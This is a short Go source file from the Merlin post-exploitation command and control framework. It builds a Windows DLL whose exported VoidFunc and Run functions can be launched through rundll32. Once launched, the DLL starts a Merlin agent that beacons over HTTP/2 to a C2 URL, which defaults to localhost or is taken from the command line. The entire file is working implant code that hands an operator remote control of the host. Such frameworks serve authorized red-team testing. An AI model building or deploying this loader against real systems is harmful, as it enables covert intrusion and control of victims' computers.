// +build windows,cgo

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2018  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"C"
	"os"
	"strings"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent"
)

func main() {}

//export VoidFunc
func VoidFunc() {
	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,VoidFunc"
	var url = "https://127.0.0.1:443/"
	if len(os.Args) >= 3 {
		if strings.HasPrefix(strings.ToLower(os.Args[0]),"rundll32"){
			url = os.Args[2]
		}
	}
	run(url)
}

//export Run
func Run(){
	VoidFunc()
}

// run is a private function called by exported functions to instantiate/execute the Agent
func run(url string){
	a := agent.New(false, false)
	a.Run(url, "h2")
}

